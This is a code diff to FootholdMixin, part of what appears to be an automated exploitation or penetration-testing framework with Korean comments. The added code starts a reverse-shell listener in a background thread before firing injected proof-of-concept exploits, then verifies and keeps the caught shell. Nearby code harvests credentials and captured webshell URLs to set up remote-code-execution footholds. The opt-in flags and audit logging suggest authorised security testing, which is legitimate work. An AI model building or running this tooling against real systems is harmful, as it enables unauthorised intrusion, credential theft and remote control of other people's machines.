@@ -47,9 +47,12 @@ class FootholdMixin:
         """3단계: 주입된 공개 PoC(--poc)를 게이트로 실행 → 자격 캡처 → world 반영."""
         if not self.exploit_exec or self.world is None or self.dry_run:
             return
+        # revshell 채널 모듈이면 PoC(리버스셸 트리거) 발사 '전에' 리스너를 선기동한다 — 트리거가
+        # 리스너보다 먼저 연결돼 콜백을 놓치는 경쟁 제거(웹 채널 모듈엔 영향 없음·None 반환).
+        prelisten = self._start_revshell_prelisten(report)
         for poc in getattr(self, "poc_commands", []) or []:
             if self._goal_reached(report) or self._time_up():
-                return
+                break
             before = len(report.enum_findings)
             self._attempt(report, report.enum_findings, poc, phase="access")
             from .exploit_run import harvest_creds, harvest_foothold
@@ -64,6 +67,84 @@ class FootholdMixin:
                     url = harvest_foothold(out, mod)
                     if url:
                         self._set_web_rce_from_capture(url, mod, report)
+        # 선기동한 리스너를 거둔다(콜백 수신분은 _prelistened_revshell 로 보관 → _acquire_session 소비).
+        self._finish_revshell_prelisten(prelisten)
+
+    def _start_revshell_prelisten(self, report):
+        """revshell 채널 내장/매니페스트 모듈이 큐잉됐을 때, PoC(리버스셸 트리거) 발사 '전에'
+        리스너를 백그라운드로 선기동한다. 웹→리버스셸 업그레이드(_maybe_upgrade_revshell)와 동일한
+        listener-first 패턴 — 트리거가 리스너보다 먼저 연결돼 콜백을 놓치는 경쟁을 없앤다.
+        opt-in(catch_revshell) + 준비된 revshell(lhost/lport) + 활성 모듈 channel=='revshell' 일
+        때만 뜬다. 조건 불충족이면 None(웹 채널 모듈·기본 흐름엔 영향 없음)."""
+        if not getattr(self, "catch_revshell", False):
+            return None
+        mod = getattr(self, "_active_exploit_module", None)
+        if mod is None or getattr(mod, "channel", "") != "revshell":
+            return None
+        lhost = getattr(report, "revshell_lhost", "") or ""
+        lport = getattr(report, "revshell_lport", 0) or getattr(self, "revshell_port", 0)
+        if not lhost or not lport:
+            return None
+        catch = getattr(self, "_revshell_catcher", None)   # 테스트 주입용(기본은 실제 소켓)
+        if catch is None:
+            try:
+                from .shell_transport import catch_reverse_shell as catch
+            except ImportError as e:
+                self.audit.event("foothold_skip", reason="revshell_transport_unavailable",
+                                 detail=str(e))
+                return None
+        import threading
+        import time
+        result: dict = {}
+        to = getattr(self, "_revshell_prelisten_timeout", 120)
+
+        def _listen():
+            try:
+                # 실제 catcher 는 timeout 을 받는다. 2-인자 테스트 catcher 는 TypeError → 폴백.
+                try:
+                    result["sess"] = catch(lhost, int(lport), timeout=to)
+                except TypeError:
+                    result["sess"] = catch(lhost, int(lport))
+            except OSError as e:
+                result["err"] = e
+
+        th = threading.Thread(target=_listen, daemon=True)
+        self.audit.event("revshell_listen", lhost=lhost, lport=int(lport), via="prelisten",
+                         timeout=to)
+        th.start()
+        time.sleep(getattr(self, "_revshell_prefire_delay", 0.5))   # 리스너 bind 여유(테스트는 0)
+        return (th, result)
+
+    def _finish_revshell_prelisten(self, prelisten) -> None:
+        """선기동 리스너 스레드를 거둔다(join). 콜백 수신 세션은 _prelistened_revshell 로 보관해
+        이후 _acquire_session 이 성립검증 후 소비한다(여기선 검증하지 않는다 — 검증은 세션 소비 측)."""
+        if prelisten is None:
+            return
+        th, result = prelisten
+        th.join(timeout=getattr(self, "_revshell_join_timeout",
+                                getattr(self, "_revshell_prelisten_timeout", 120) + 5))
+        sess = result.get("sess")
+        if sess is not None:
+            self._prelistened_revshell = sess
+
+    def _consume_prelistened_revshell(self, looks_like_shell, verify_probe_command):
+        """선기동 리스너가 받아둔 리버스셸 세션이 있으면 성립검증 후 반환(1회 소비). 없거나 검증
+        실패면 None(→ _acquire_session 의 웹/리버스셸 분기로 진행). 거짓 발판 방지."""
+        session = getattr(self, "_prelistened_revshell", None)
+        if session is None:
+            return None
+        self._prelistened_revshell = None   # 1회 소비(재진입 가드)
+        try:
+            ok = bool(session.alive and looks_like_shell(session.run(verify_probe_command())))
+        except OSError as e:
+            self.audit.event("revshell_catch_error", error=f"{type(e).__name__}: {e}")
+            session.close()
+            return None
+        if not ok:
+            session.close()
+            return None
+        self.audit.event("revshell_foothold", via="prelisten")
+        return session
 
     def _set_web_rce_from_capture(self, url, module, report):
         """캡처한 웹셸 URL 로 웹 RCE 발판 스펙을 세팅한다(생성 전용 — 세션 획득은 _acquire_web_rce).
@@ -315,8 +396,15 @@ class FootholdMixin:
         if self.world is None or not self.auto_poc:
             return None
         from .session_verify import looks_like_shell, verify_probe_command
-        # (1) 웹 RCE 분기 — web_product 가 식별된 경우에만
-        if self.world.web_product:
+        # (0) revshell 채널 모듈: _exploit_run_stage 가 PoC(리버스셸 트리거) 발사 '전에' 리스너를
+        # 선기동해 받아둔 세션이 있으면, 그것을 성립검증 후 사용한다(트리거가 리스너보다 먼저 터지는
+        # 경쟁을 제거 — 웹→리버스셸 업그레이드와 동일한 listener-first 보장). 없으면 아래 분기로.
+        pre = self._consume_prelistened_revshell(looks_like_shell, verify_probe_command)
+        if pre is not None:
+            return pre
+        # (1) 웹 RCE 분기 — web_product 가 식별됐거나, PoC 가 웹셸 URL(rce_url)을 캡처한 경우.
+        # (수동 --poc 로 핑거프린트 없이 웹셸만 드롭된 경우에도 캡처 URL 로 발판을 잇는다.)
+        if self.world.web_product or getattr(self, "rce_url", ""):
             ws = self._acquire_web_rce(report, looks_like_shell, verify_probe_command)
             if ws is not None:
                 # 웹 RCE 확보 시, opt-in(catch_revshell) + 공격자 IP 가 있으면 '리버스셸 업그레이드'
